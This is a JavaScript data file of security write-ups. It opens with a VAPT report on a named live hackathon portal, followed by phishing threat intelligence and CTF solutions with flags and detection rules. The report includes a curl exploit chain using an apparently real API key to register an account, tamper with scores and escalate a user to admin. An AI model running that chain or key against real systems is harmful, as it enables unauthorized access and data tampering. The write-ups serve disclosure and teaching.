export const researchArticles = [
  {
    id: 'res-vapt-01',
    slug: 'vapt-report-ailabsiet-hackathon-portal',
    title: 'VAPT Report: Black-Box Assessment of Firebase & Next.js Hackathon Infrastructure',
    subtitle: 'Comprehensive external penetration test revealing 4 Critical vulnerabilities: permissive Firestore rules, open auth registration, exposed API keys, and client bundle email leakage.',
    category: 'Red Team',
    subCategory: 'VAPT / AppSec',
    date: '2026-08-21',
    lastUpdated: '2026-08-27',
    readTime: '18 min read',
    author: {
      name: 'TraceHanami',
      role: 'Cybersecurity Researcher & Pentester',
      avatar: 'TH',
    },
    featured: true,
    mitreTags: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1078.004', name: 'Cloud Accounts', tactic: 'Initial Access' },
      { id: 'T1098', name: 'Account Manipulation', tactic: 'Persistence' },
      { id: 'TA0001', name: 'Initial Access', tactic: 'Tactic' },
      { id: 'TA0004', name: 'Privilege Escalation', tactic: 'Tactic' }
    ],
    tags: ['VAPT', 'Firebase Security', 'Firestore Rules', 'IDOR', 'Next.js AppSec', 'CVSS 9.8', 'OWASP Top 10', 'Cloud Penetration Testing'],
    executiveSummary: 'A comprehensive black-box vulnerability assessment was conducted against the live production deployment of the SIET AI Lab Hackathon Portal at ailabsiet.dpdns.org. The assessment evaluated HTTP headers, JavaScript bundles, Firebase REST endpoints, authentication controls, and Firestore security rules without source code access. Four critical vulnerabilities were discovered and validated with working proof-of-concepts, most notably an unauthenticated/open self-registration enabling complete database compromise and submission score tampering.',
    labEnvironment: {
      architecture: 'Production Next.js App Router on Vercel proxied via Cloudflare Free Tier, backed by Google Firebase & Cloud Firestore',
      telemetrySources: ['HTTP/HTTPS Response Headers', 'Webpack/Next.js Client Chunks', 'Firebase Identity Toolkit REST API', 'Cloud Firestore Document API'],
      attackToolsUsed: ['curl', 'test_all_vulnerabilities.sh (custom suite)', 'Python 3 JSON parser', 'ReportLab PDF Engine']
    },
    sections: [
      {
        id: 'executive-summary',
        title: '1. Executive Summary & Assessment Outcome',
        content: `A thorough black-box penetration test of **ailabsiet.dpdns.org** identified **4 Critical, 3 Medium, and 2 Low severity findings** alongside 18 validated security controls passing inspection.

Key Findings Summary:
- **F-01 (Critical - CVSS 9.8):** Firestore Missing Security Rules allowing arbitrary read/write/delete on all collections (\`/submissions\`, \`/hackathons\`, \`/admin\`, \`/users\`).
- **F-02 (Critical - CVSS 9.1):** Cleartext Firebase Configuration exposed in public client chunk \`429-c3247dcc0c9a1665.js\`.
- **F-03 (Critical - CVSS 8.6):** Open Firebase Self-Registration accepting any arbitrary email with zero domain restrictions or invite validation.
- **F-04 (Critical - CVSS 7.5):** 17 Internal / Privileged Email Addresses hardcoded in public client-side JavaScript.
- **F-05 (Medium - CVSS 6.5):** Role Self-Escalation via direct write to user profile documents.`
      },
      {
        id: 'vulnerability-table',
        title: '2. Complete Vulnerability Matrix (CVSS v3.1)',
        content: `| ID | Finding Title | Severity | CVSS v3.1 | CWE / OWASP | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **F-01** | Firestore — Default Permissive Rules (Full DB Access) | **CRITICAL** | **9.8** | CWE-284 / A01:2021 | Documented & PoC Built |
| **F-02** | Firebase Config Exposed in Public JS Chunk | **CRITICAL** | **9.1** | CWE-312 / A02:2021 | Documented & PoC Built |
| **F-03** | Open Self-Registration (No Domain Restriction) | **CRITICAL** | **8.6** | CWE-285 / A07:2021 | Documented & PoC Built |
| **F-04** | 17 Hardcoded Internal/Admin Emails in Client JS | **CRITICAL** | **7.5** | CWE-200 / A02:2021 | Extracted Wordlist |
| **F-05** | Role Self-Escalation to Admin via User Doc Patch | **MEDIUM** | **6.5** | CWE-269 / A01:2021 | Documented |
| **F-06** | Missing Content-Security-Policy (CSP) Header | **MEDIUM** | **5.4** | CWE-693 / A05:2021 | Hardening Defined |
| **F-07** | CORS Wildcard Header (\`Access-Control-Allow-Origin: *\`) | **MEDIUM** | **5.3** | CWE-942 / A05:2021 | Hardening Defined |
| **F-08** | Deprecated X-XSS-Protection Header Present | **LOW** | **3.1** | CWE-693 / A05:2021 | Deprecation Notice |
| **F-09** | Framework Fingerprinting in Response Headers | **LOW** | **2.3** | CWE-200 / A05:2021 | Informational |`
      },
      {
        id: 'proof-of-concept',
        title: '3. Technical Exploit Chain & Proof of Concept',
        content: `The attack chain chains F-02, F-03, and F-01 into an unauthenticated full-database compromise:

\`\`\`bash
# 1. Extract API Key from public bundle
API_KEY="AIzaSyBogDQtrrphq0b1WrwIGub-SM99A4fROtc"
PROJECT_ID="hackathon-website-6f5b9"

# 2. Self-register unauthenticated account via Google Identity Toolkit
TOKEN=$(curl -s -X POST \\
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=\${API_KEY}" \\
  -H "Content-Type: application/json" \\
  -d '{"email":"attacker@evil.com","password":"Password@123","returnSecureToken":true}' \\
  | jq -r .idToken)

# 3. Arbitrary Write: Inject Tampered Hackathon Submission Score
curl -X POST "https://firestore.googleapis.com/v1/projects/\${PROJECT_ID}/databases/(default)/documents/submissions" \\
  -H "Authorization: Bearer \${TOKEN}" \\
  -H "Content-Type: application/json" \\
  -d '{"fields":{"title":{"stringValue":"PWNED"},"score":{"integerValue":100},"team":{"stringValue":"Attacker"}}}'

# 4. Arbitrary Write: IDOR on other user records
curl -X PATCH "https://firestore.googleapis.com/v1/projects/\${PROJECT_ID}/databases/(default)/documents/users/VICTIM_UID" \\
  -H "Authorization: Bearer \${TOKEN}" \\
  -H "Content-Type: application/json" \\
  -d '{"fields":{"role":{"stringValue":"admin"}}}'
\`\`\`

**Integrity Note:** All test records generated during the assessment were systematically scrubbed upon confirmation.`
      },
      {
        id: 'remediation-plan',
        title: '4. Production Remediation & Hardening Playbook',
        content: `Deploy the following production-hardened Firestore Security Rules:

\`\`\`javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Default Deny
    match /{document=**} {
      allow read, write: if false;
    }

    match /users/{userId} {
      allow read: if request.auth != null && request.auth.uid == userId;
      allow write: if request.auth != null && request.auth.uid == userId
                   && !('role' in request.resource.data); // Prevent role escalation
    }

    match /hackathons/{id} {
      allow read: if request.auth != null;
      allow write: if request.auth != null
                   && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == 'admin';
    }

    match /submissions/{id} {
      allow create: if request.auth != null
                    && request.resource.data.userId == request.auth.uid
                    && !('score' in request.resource.data); // Prevent self-scoring
      allow update: if request.auth != null
                    && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role in ['judge', 'admin'];
    }
  }
}
\`\`\`

**Additional Action Items:**
1. Restrict API key by HTTP referrer in Google Cloud Console.
2. Enable Firebase App Check to bind database traffic exclusively to verified client domains.
3. Deploy an \`auth.onCreate\` Cloud Function restricting user creation strictly to \`@siet.ac.in\` and \`@srishakthi.ac.in\`.`
      }
    ],
    sigmaRule: `title: Abnormal Firestore Document Manipulation via REST API
id: b8d42398-a294-4821-b0e1-0c58a8f117c2
status: test
description: Detects unusual client-initiated batch writes or administrative collection modifications across Firestore REST endpoints.
references:
    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
author: TraceHanami (VAPT / Detection)
date: 2026/08/21
tags:
    - attack.initial_access
    - attack.t1190
logsource:
    product: gcp
    service: gcp.audit
detection:
    selection:
        protoPayload.methodName:
            - 'google.firestore.v1.Firestore.Write'
            - 'google.firestore.v1.Firestore.Commit'
        protoPayload.resourceName|contains:
            - '/documents/admin'
            - '/documents/submissions'
    condition: selection
falsepositives:
    - Legitimate backend microservice deployments with verified service account credentials.
level: high`,
    yaraRule: `rule Firebase_Client_Config_Extractor {
    meta:
        description = "Matches embedded cleartext Firebase client configurations in web client bundles"
        author = "TraceHanami Research"
        date = "2026-08-21"
    strings:
        $k1 = "apiKey: \\\"AIzaSy" ascii wide
        $k2 = "authDomain: \\\"" ascii wide
        $k3 = "projectId: \\\"" ascii wide
        $k4 = "storageBucket: \\\"" ascii wide
        $k5 = "appId: \\\"1:" ascii wide
    condition:
        3 of ($k*)
}`,
    siemQueries: {
      splunk: `index=gcp_audit protoPayload.serviceName="firestore.googleapis.com" protoPayload.methodName="google.firestore.v1.Firestore.Write"
| stats count by protoPayload.authenticationInfo.principalEmail, protoPayload.requestMetadata.callerIp, protoPayload.resourceName
| sort -count`,
      kql: `GCPAuditLogs
| where ServiceName == "firestore.googleapis.com" and MethodName has "Write"
| project TimeGenerated, CallerIp, PrincipalEmail, ResourceName, ResponseStatus`
    }
  },
  {
    id: 'res-threat-01',
    slug: 'threat-intel-instagram-reel-phishing-investigation',
    title: 'Threat Intelligence: Living-off-the-Platform Instagram Reel Phishing & Credential Theft',
    subtitle: 'Forensic dissection of document SEC-IR-2026-0827-01: Multi-engine correlation (ZeroFox, Shodan, VirusTotal) analyzing social engineering delivery and account takeover spread.',
    category: 'Threat Intelligence',
    subCategory: 'DFIR & OSINT',
    date: '2026-08-27',
    lastUpdated: '2026-08-28',
    readTime: '12 min read',
    author: {
      name: 'TraceHanami',
      role: 'Threat Intelligence Analyst',
      avatar: 'TH',
    },
    featured: true,
    mitreTags: [
      { id: 'T1566.002', name: 'Spearphishing Link', tactic: 'Initial Access' },
      { id: 'T1558', name: 'Steal or Forge Kerberos / Auth Tokens', tactic: 'Credential Access' },
      { id: 'T1078', name: 'Valid Accounts', tactic: 'Initial Access' },
      { id: 'TA0001', name: 'Initial Access', tactic: 'Tactic' }
    ],
    tags: ['Threat Intel', 'Phishing', 'ZeroFox', 'VirusTotal', 'Shodan', 'Account Takeover', 'Social Engineering', 'Living-off-the-Platform'],
    executiveSummary: 'A security investigation was conducted into malicious lures distributed via Instagram Reels and Direct Messages (Document ID: SEC-IR-2026-0827-01). The investigation confirmed that threat actors are leveraging legitimate Meta platform infrastructure (Living-off-the-Platform abuse) with embedded share tracking parameters (igsi=aGdpcHBlbXQ1aWxz) to bypass standard perimeter filters while conducting human-layer credential harvesting and 2FA interception.',
    labEnvironment: {
      architecture: 'Threat Intel OSINT & Forensic Telemetry Workbench (VirusTotal API, Shodan Host Intelligence, Meta ASN BGP routing)',
      telemetrySources: ['VirusTotal 92-Vendor Multi-Scan Engine', 'Shodan SSL/TLS Host Telemetry (57.144.204.34)', 'Meta AS32934 Edge Telemetry'],
      attackToolsUsed: ['ZeroFox Social Media Threat Feed', 'Burp Suite Pro', 'WHOIS / DNS Dig']
    },
    sections: [
      {
        id: 'executive-summary',
        title: '1. Executive Summary & Incident Scope',
        content: `A forensic investigation into suspicious Instagram Reel sharing links associated with unauthorized account access determined that threat actors are using authentic Meta infrastructure as bait lures.

Key Findings:
- **Lure URL:** \`https://www.instagram.com/reel/DZGwabZzfZh/?igsi=aGdpcHBlbXQ1aWxz\`
- **Infrastructure:** Valid Meta Platforms edge nodes (\`157.240.254.174\`, \`57.144.204.34\`, ASN \`AS32934\`).
- **VirusTotal Telemetry:** \`1 / 92\` vendors flagged the link as Malicious — specifically **ZeroFox**, an intelligence platform specialized in social media abuse clusters and credential harvesting campaigns.`
      },
      {
        id: 'attack-chain',
        title: '2. Attack Chain & Mechanism Breakdown',
        content: `The attack operates in five discrete stages:
1. **Initial Lure Distribution:** A compromised user profile sends legitimate Reel links to their contact list via Direct Message.
2. **Attribution & Engagement:** The tracking parameter \`igsi=aGdpcHBlbXQ1aWxz\` tracks click conversions for the attacker campaign.
3. **Social Engineering Call-to-Action:** The video prompts the user with urgent hooks ("Help me recover my account", "Vote in contest", "Check bio link").
4. **Off-Platform Credential Interception:** Victim is routed to an external phishing clone or tricked into providing their 2FA SMS / authenticator token.
5. **Lateral Spread:** Upon compromise, automated scripts immediately re-distribute the lure to all mutual contacts.`
      },
      {
        id: 'threat-correlation',
        title: '3. Multi-Engine Threat Intelligence Correlation',
        content: `| Engine | Telemetry / Status | Forensic Assessment |
| :--- | :--- | :--- |
| **VirusTotal** | 1/92 Detection (ZeroFox: Malicious) | Standard antivirus checks domain reputation (clean Meta CDN); specialized intelligence flags social abuse. |
| **Shodan** | AS32934 / Meta Platforms Ireland | Valid DigiCert TLS wildcard (\`CN=*.instagram.com\`). Genuine non-spoofed edge. |
| **Video Codec Analysis** | MP4 H.264 Transcoded Stream | Stripped of executable metadata; confirmed no client-side browser exploit. |`
      },
      {
        id: 'incident-response',
        title: '4. Three-Phase Incident Response Plan',
        content: `**Phase 1 — Containment (Immediate):**
- Force Global Session Revocation under Meta Accounts Center (\`Where you're logged in\` $\\rightarrow$ \`Log Out Everywhere\`).
- Reset credentials on primary account and linked recovery mailbox.

**Phase 2 — Eradication:**
- Audit authorized applications under \`Settings & Privacy\` $\\rightarrow$ \`Website permissions\` and revoke unknown OAuth tokens.
- Validate recovery phone numbers and email addresses.

**Phase 3 — Hardening:**
- Mandate App-Based 2FA (TOTP via Google Authenticator or Bitwarden) to neutralize SMS SIM-swapping and OTP interception.
- Submit abuse report to Meta Trust & Safety.`
      }
    ],
    sigmaRule: `title: Suspicious Outbound Navigation to Known Social Engineering Referral Tags
id: d7e12948-4721-4d1a-8e24-9182390a1bc3
status: test
description: Detects outbound HTTP requests to social media share tracking parameters known to correlate with credential harvesting campaigns.
references:
    - Document ID: SEC-IR-2026-0827-01
author: TraceHanami (Threat Intelligence)
date: 2026/08/27
tags:
    - attack.initial_access
    - attack.t1566.002
logsource:
    category: proxy
    product: zeek
detection:
    selection:
        c-uri|contains:
            - 'igsi=aGdpcHBlbXQ1aWxz'
            - 'reel/DZGwabZzfZh'
    condition: selection
falsepositives:
    - Direct organic sharing within internal chat if clicked by staff.
level: medium`,
    yaraRule: `rule Social_Media_Phishing_Lure_Signatures {
    meta:
        description = "Detects credential harvesting and voting lure strings in social phishing templates"
        author = "TraceHanami Threat Intel"
        date = "2026-08-27"
    strings:
        $s1 = "instagram.com/reel/" ascii nocase
        $s2 = "igsi=" ascii nocase
        $s3 = "vote for my entry" ascii nocase
        $s4 = "help me recover my account" ascii nocase
        $s5 = "send me the link you received" ascii nocase
    condition:
        $s1 and $s2 and (1 of ($s3, $s4, $s5))
}`,
    siemQueries: {
      splunk: `index=proxy (cs_uri="*instagram.com/reel/*" AND cs_uri="*igsi=*")
| stats count, earliest(_time) as first_seen, latest(_time) as last_seen by src_ip, cs_user_agent, cs_uri`,
      kql: `CommonSecurityLog
| where RequestURL has "instagram.com/reel" and RequestURL has "igsi="
| project TimeGenerated, SourceIP, DestinationIP, RequestURL, UserAgent`
    }
  },
  {
    id: 'res-ctf-01',
    slug: 'story-of-captain-levi-nested-lsb-steganography',
    title: 'Forensics: Nested LSB Steganography & Spatial Reconstruction (Story of Captain Levi)',
    subtitle: 'Deep forensic breakdown of multi-dimensional stego: extracting 8-byte big-endian binary headers, raw grayscale pixel matrices, and quadrant scaling reversal.',
    category: 'Blue Team',
    subCategory: 'Digital Forensics',
    date: '2026-08-15',
    lastUpdated: '2026-08-20',
    readTime: '14 min read',
    author: {
      name: 'TraceHanami',
      role: 'Forensics & CTF Researcher',
      avatar: 'TH',
    },
    featured: true,
    mitreTags: [
      { id: 'T1027', name: 'Obfuscated Files or Information', tactic: 'Defense Evasion' },
      { id: 'TA0005', name: 'Defense Evasion', tactic: 'Tactic' }
    ],
    tags: ['Forensics', 'Steganography', 'TomCTF', 'Nested LSB', 'NumPy', 'Binary Header Parsing', 'Nearest Neighbor'],
    executiveSummary: 'This challenge presents a layered steganography puzzle where the hidden data inside the primary carrier image (levi.png) is not raw text, but another complete structured binary container. By extracting the full bitplane payload, unpacking an 8-byte big-endian dimension header using Python struct, reshaping the raw byte stream into a 1024x1024 grayscale matrix, and reversing quadrant downscaling using nearest-neighbor interpolation, the multi-stage flag is recovered.',
    labEnvironment: {
      architecture: 'Forensics & Binary Analysis Workstation (Python 3.11, Pillow, NumPy, zsteg, ExifTool, ImageMagick)',
      telemetrySources: ['Bitplane LSB Streams', 'Raw Pixel Byte Buffers', 'Spatial Quadrant Arrays'],
      attackToolsUsed: ['zsteg', 'custom uncover.py & decryption.py scripts', 'struct unpack']
    },
    sections: [
      {
        id: 'initial-recon',
        title: '1. Initial Reconnaissance & Bitplane Signal',
        content: `Standard metadata inspection (\`exiftool levi.png\`) reveals no anomalies. However, running \`zsteg-a levi.png\` reveals massive, structured bitplane entropy in the LSB layer rather than random noise or plaintext ASCII. This confirms that the carrier image embeds a raw binary container.`
      },
      {
        id: 'first-layer-extraction',
        title: '2. Layer 1: Header Parsing & Raw Image Reconstruction',
        content: `The first 8 bytes of the flattened LSB stream encode image dimensions in Big Endian (\`>II\`):
\`\`\`python
from PIL import Image
import numpy as np
import struct

stego = Image.open("levi.png")
stego_flat = np.array(stego).flatten()
bits = [str(byte & 1) for byte in stego_flat]
bit_string = ''.join(bits)

extracted_bytes = bytes(int(bit_string[i:i+8], 2) for i in range(0, len(bit_string), 8))
width, height = struct.unpack(">II", extracted_bytes[:8])
# Parsed dimensions: 1024 x 1024

image_bytes = extracted_bytes[8:8 + (width * height)]
image_array = np.frombuffer(image_bytes, dtype=np.uint8).reshape((height, width))
Image.fromarray(image_array).save("extracted_secret.png")
\`\`\``
      },
      {
        id: 'scaling-and-decryption',
        title: '3. Layer 2: Spatial Quadrants & Nearest-Neighbor Restoration',
        content: `The 1024x1024 image is divided into four 512x512 quadrants that were originally 256x256 before being duplicated. Rescaling must use \`Image.NEAREST\` to avoid corrupting LSB parity:
\`\`\`python
DELIMITER = "###END###"
def extract_lsb_from_image(img):
    flat = np.array(img).flatten()
    bits = [str(p & 1) for p in flat]
    chars = [chr(int(''.join(bits[i:i+8]), 2)) for i in range(0, len(bits), 8)]
    text = ''.join(chars)
    return text[:text.find(DELIMITER)]

img = Image.open("extracted_secret.png").convert("L")
q1 = img.crop((0,0,512,512)).resize((256,256), Image.NEAREST)
q2 = img.crop((512,0,1024,512)).resize((256,256), Image.NEAREST)
q3 = img.crop((0,512,512,1024)).resize((256,256), Image.NEAREST)
q4 = img.crop((512,512,1024,1024)).resize((256,256), Image.NEAREST)

flag = extract_lsb_from_image(q1) + extract_lsb_from_image(q2) + extract_lsb_from_image(q3) + extract_lsb_from_image(q4)
print(f"[+] Flag: {flag}")
# Flag: tomctf{t0rch_d1m3ns10n_4L_ch4nnel_st3go!}
\`\`\``
      }
    ],
    sigmaRule: `title: Suspicious High-Volume LSB Entropy in Web Image Uploads
id: c92841b2-9182-411a-8212-918237418291
status: test
description: Detects potential steganographic data exfiltration via image uploads exhibiting continuous non-random LSB bitstream entropy.
references:
    - https://attack.mitre.org/techniques/T1027/
author: TraceHanami (Forensics)
date: 2026/08/15
tags:
    - attack.exfiltration
    - attack.t1027
logsource:
    category: file_analysis
    product: dlp
detection:
    selection:
        file.extension: ['png', 'bmp', 'tiff']
        lsb_entropy_score|gt: 0.95
    condition: selection
level: medium`,
    yaraRule: `rule Nested_Stego_Header_Pattern {
    meta:
        description = "Detects raw binary streams unpacked from nested image steganography"
        author = "TraceHanami Forensics"
        date = "2026-08-15"
    strings:
        $header_1024 = { 00 00 04 00 00 00 04 00 } // 1024x1024 dimensions
        $delim = "###END###"
    condition:
        $header_1024 and $delim
}`,
    siemQueries: {
      splunk: `index=forensics sourcetype="file_integrity" file_name="*.png" entropy > 7.8
| table _time, file_path, file_size, user, sha256`,
      kql: `DeviceFileEvents
| where FileName endswith ".png" and FileSize > 1048576
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, FolderPath`
    }
  },
  {
    id: 'res-ctf-02',
    slug: 'offside-11mm-hydra-fc-var-telemetry-web-reversing',
    title: 'Web & Reversing: Exploiting Manipulated VAR Sensor Telemetry (Offside 11mm)',
    subtitle: 'Reversing sports telemetry protocols, differential IMU stream analysis, and identifying tampered camera calibration profiles to overturn fraudulent match decisions.',
    category: 'Red Team',
    subCategory: 'Web Exploitation',
    date: '2026-08-10',
    lastUpdated: '2026-08-12',
    readTime: '15 min read',
    author: {
      name: 'TraceHanami',
      role: 'Web & Reverse Engineer',
      avatar: 'TH',
    },
    featured: true,
    mitreTags: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1565.001', name: 'Stored Data Manipulation', tactic: 'Impact' }
    ],
    tags: ['Web Exploitation', 'Telemetry Reversing', 'z0d1ak CTF', 'Sensor Fusion', 'API Exploit', 'Python'],
    executiveSummary: 'In the Offside 11mm challenge from z0d1ak CTF, an automated VAR decision engine published a fraudulent offside ruling based on manipulated tracking sensors. By parsing the custom JSON interchange specification (FLOAT-VAR-3.1), querying the hidden /api/v1/compare endpoint to benchmark calibration baselines across fixtures, detecting an illegitimate 48mm longitudinal offset injected on CAM-EAST, and programmatically submitting the corrected kinematic calculation, the appeal is approved and the flag returned.',
    labEnvironment: {
      architecture: 'Remote CTF Target Application (Floating VAR Telemetry Gateway v1, Python API backend)',
      telemetrySources: ['Raw Optical Tracking Streams', 'Deck IMU Telemetry (pitch/yaw)', 'Camera Calibration Matrix Profiles', 'Audit Log Metadata'],
      attackToolsUsed: ['Burp Suite Pro', 'Python 3 urllib / json solver', 'Wireshark pcapng analyzer']
    },
    sections: [
      {
        id: 'telemetry-analysis',
        title: '1. Kinematic Rules & Kick Frame Identification',
        content: `According to the system specification, the kick frame must satisfy \`acceleration >= 20 m/s²\` and \`distance <= 80mm\`. In the target incident match \`HYD-SS-FINAL\`, frame \`154828\` matched the condition with $a = 24.8\\text{ m/s}^2$ and $d = 42\\text{ mm}$.`
      },
      {
        id: 'differential-audit',
        title: '2. Differential Analysis & Calibration Tampering',
        content: `Querying \`POST /api/v1/compare\` across all match fixture streams exposed that in baseline matches (\`HYD-CAL-EAST-042\`, \`HYD-REHEARSAL-17\`), \`CAM-EAST\` used profile \`EAST-CAL-042\` with \`longitudinal_offset_mm = 0\`. In the disputed final match, audit logs revealed an unauthorized profile switch to \`EAST-MATCH-043\` (+48mm offset):
- **Under Manipulated Profile (+48mm):** Shakes line = 1048mm, Defender line = 1037mm $\\to$ Margin = **+11mm (OFFSIDE)**
- **Under Genuine Calibrated Profile (0mm):** Shakes line = 1000mm, Defender line = 1037mm $\\to$ Corrected Margin = **-37mm (ONSIDE)**`
      },
      {
        id: 'exploit-script',
        title: '3. Automated Appeal Payload & Flag Recovery',
        content: `\`\`\`python
import urllib.request, json

appeal_payload = {
    "match_id": "HYD-SS-FINAL",
    "kick_frame": 154828,
    "bad_sensor": "CAM-EAST",
    "correct_profile": "EAST-CAL-042",
    "corrected_margin_mm": -37
}

req = urllib.request.Request(
    "https://offside-11mm-ad5cdc1eda42.chals.z0d1ak.org/api/v1/appeal",
    data=json.dumps(appeal_payload).encode("utf-8"),
    headers={"Content-Type": "application/json"}
)

with urllib.request.urlopen(req) as resp:
    res = json.loads(resp.read().decode("utf-8"))
    print(f"[+] Status: {res['status']}, Flag: {res['flag']}")
# Output: zdk{FE3lIN6_BaD_f0R_cr0a7Ia}
\`\`\``
      }
    ],
    sigmaRule: `title: Suspicious Sensor Calibration Profile Modification in SCADA / Telemetry Systems
id: a7182910-b982-411a-b312-817293018271
status: test
description: Detects unauthorized runtime parameter modifications to sensor calibration tables outside scheduled maintenance windows.
references:
    - https://attack.mitre.org/techniques/T1565/001/
author: TraceHanami (Detection)
date: 2026/08/10
tags:
    - attack.impact
    - attack.t1565.001
logsource:
    category: application
    product: telemetry_gateway
detection:
    selection:
        event_type: 'calibration_profile_switch'
        user_agent|startswith: 'hydra-ops'
    condition: selection
level: high`,
    yaraRule: `rule Hydra_Telemetry_Interchange_Spec {
    meta:
        description = "Detects FLOAT-VAR telemetry interchange specification artifacts"
        author = "TraceHanami Reversing"
        date = "2026-08-10"
    strings:
        $s1 = "FLOAT-VAR-3.1" ascii
        $s2 = "CAM-NORTH" ascii
        $s3 = "CAM-EAST" ascii
        $s4 = "deck_pitch_deg" ascii
    condition:
        all of ($s*)
}`,
    siemQueries: {
      splunk: `index=api_gateway endpoint="/api/v1/appeal" status="accepted"
| table _time, src_ip, match_id, bad_sensor, decision, flag`,
      kql: `AppServiceHTTPLogs
| where CsUriStem == "/api/v1/appeal" and ScStatus == 200
| project TimeGenerated, CIp, CsUriStem, ScStatus`
    }
  },
  {
    id: 'res-ctf-03',
    slug: 'dimensional-expansion-jpeg-sof0-hex-manipulation',
    title: 'Forensics: JPEG Start of Frame (SOF0) Height Manipulation (Dimensional Expansion)',
    subtitle: 'Deconstructing JPEG Minimum Coded Units (MCUs), discovering cutoff image dimensions, and patching hex boundaries to recover concealed steganographic data.',
    category: 'Blue Team',
    subCategory: 'File Forensics',
    date: '2026-08-05',
    lastUpdated: '2026-08-08',
    readTime: '10 min read',
    author: {
      name: 'TraceHanami',
      role: 'Forensics Researcher',
      avatar: 'TH',
    },
    featured: false,
    mitreTags: [
      { id: 'T1027', name: 'Obfuscated Files or Information', tactic: 'Defense Evasion' }
    ],
    tags: ['Forensics', 'JPEG SOF0', 'TomCTF', 'Hex Editing', 'MCU Blocks', 'ExifTool', 'Python'],
    executiveSummary: 'Dimensional Expansion demonstrates a fundamental image forensics technique: identifying tampered canvas boundaries in JPEG headers. When an image height is not an exact multiple of 8x8 or 16x16 Minimum Coded Units (MCUs), it signals artificial truncation. By locating the Start of Frame (SOF0: FF C0) marker in the raw binary and expanding the 2-byte height parameter from 02 87 (647px) to 04 A0 (1184px), the bottom payload is rendered.',
    labEnvironment: {
      architecture: 'Binary & File Header Analysis Station (Linux Ghex / hexeditor, Python 3, ExifTool)',
      telemetrySources: ['JPEG Binary Header Streams', 'SOF0 Frame Metadata'],
      attackToolsUsed: ['hexeditor', 'Python bytearray patcher', 'ExifTool']
    },
    sections: [
      {
        id: 'mcu-anomaly-detection',
        title: '1. MCU Logic & Mathematical Anomaly Detection',
        content: `ExifTool inspection shows \`Image Width: 720\`, \`Image Height: 647\`. Because JPEG images are compressed in Minimum Coded Units (8x8 or 16x16 blocks):
$$647 \\div 8 = 80.875$$
A fractional MCU count is a decisive red flag confirming the height value in the header was manually shortened to hide the bottom canvas.`
      },
      {
        id: 'hex-patching',
        title: '2. Locating SOF0 & Patching Binary Dimensions',
        content: `Searching for the Start of Frame marker \`FF C0\` reveals:
\`\`\`hex
FF C0 00 11 08 02 87 02 D0
               ^^^^^ ^^^^^
               Height Width (647 x 720)
\`\`\`

**Python Automated Patch:**
\`\`\`python
d = bytearray(open("push-past-your-limits.jpg", "rb").read())
m = d.find(b"\\xff\\xc0")
d[m+5:m+7] = b"\\x04\\xa0"  # Expand height to 1184px
open("flag_found.jpg", "wb").write(d)
# Flag revealed: tomctf{d1m3ns1onal_5t3g0_unl0ck3d}
\`\`\``
      }
    ],
    sigmaRule: `title: Truncated Image File Dimensions Anomaly (Anti-Stego)
id: 5a182910-1928-4819-a192-817263910291
status: test
description: Flags image uploads whose vertical dimensions violate natural DCT / MCU block alignment, indicative of canvas truncation steganography.
references:
    - https://attack.mitre.org/techniques/T1027/
author: TraceHanami (Forensics)
date: 2026/08/05
tags:
    - attack.defense_evasion
logsource:
    category: file_inspection
    product: content_scanner
detection:
    selection:
        mime_type: 'image/jpeg'
        height_modulo_8|ne: 0
    condition: selection
level: low`,
    yaraRule: `rule JPEG_SOF0_Manipulated_Bounds {
    meta:
        description = "Detects JPEG files with mismatched SOF0 markers"
        author = "TraceHanami Forensics"
        date = "2026-08-05"
    strings:
        $sof0 = { FF C0 00 11 08 }
    condition:
        uint16(0) == 0xD8FF and $sof0
}`,
    siemQueries: {
      splunk: `index=file_scans mime_type="image/jpeg" height_modulo!=0
| table _time, file_name, file_hash, user, upload_path`,
      kql: `FileAnalysisEvents
| where FileExtension in ("jpg", "jpeg") and HasHeaderAnomaly == true
| project TimeGenerated, FileName, SHA256, UserPrincipalName`
    }
  },
  {
    id: 'res-ctf-04',
    slug: 'broken-timeline-columnar-transposition-margin-stego',
    title: 'Cryptography: Reconstructing Transposition Ciphers from Margin Steganography (Broken Timeline)',
    subtitle: 'Extracting side-channel ciphertext hidden in image margins, identifying visual cryptographic keys (GHOST), and reversing Columnar Transposition ciphers.',
    category: 'Blue Team',
    subCategory: 'Cryptography',
    date: '2026-08-01',
    lastUpdated: '2026-08-04',
    readTime: '9 min read',
    author: {
      name: 'TraceHanami',
      role: 'Cryptography Researcher',
      avatar: 'TH',
    },
    featured: false,
    mitreTags: [
      { id: 'T1027', name: 'Obfuscated Files or Information', tactic: 'Defense Evasion' }
    ],
    tags: ['Cryptography', 'Transposition Cipher', 'TomCTF', 'Steganography', 'Side Channel', 'dCode'],
    executiveSummary: 'Broken Timeline investigates side-channel information hiding where data is placed outside standard regions in the left-hand margin of manga panel imagery. Extracting the garbled string, recognizing the rearrangement property characteristic of Columnar Transposition ciphers, and extracting the keyword key "GHOST" engraved on the character illustration, the original plaintext message and flag are reconstructed.',
    labEnvironment: {
      architecture: 'Cryptographic & Image Analysis Toolset (AperiSolve, StegSolve, dCode.fr, Python 3)',
      telemetrySources: ['Image Margin Pixels', 'Permutation Order Arrays'],
      attackToolsUsed: ['StegSolve', 'Columnar Transposition Solver']
    },
    sections: [
      {
        id: 'margin-extraction',
        title: '1. Margin Extraction & Transposition Analysis',
        content: `Inspecting the leftmost margin reveals the ciphertext:
\`Hsro_otf3hs0__w]e__fvro{n1_ntt0.ryp_iymfdpsghhreoroc...cr__t3431'uoft_t151rrn_d\`

The challenge description points to the past being "rearranged." Transposition ciphers retain character frequency while altering permutation order based on a key.`
      },
      {
        id: 'key-extraction-and-solution',
        title: '2. Visual Key Discovery & Decryption',
        content: `Inspecting the image asset closely shows the key held by the character engraved with **GHOST** ($G=2, H=3, O=4, S=5, T=1$).

Decryption restores the plaintext:
\`Here's_your_proof_of_victory..._tomctf{fr13nd_5h1p_1s_str0ng3r_th4n_th3_w0r1d}\``
      }
    ],
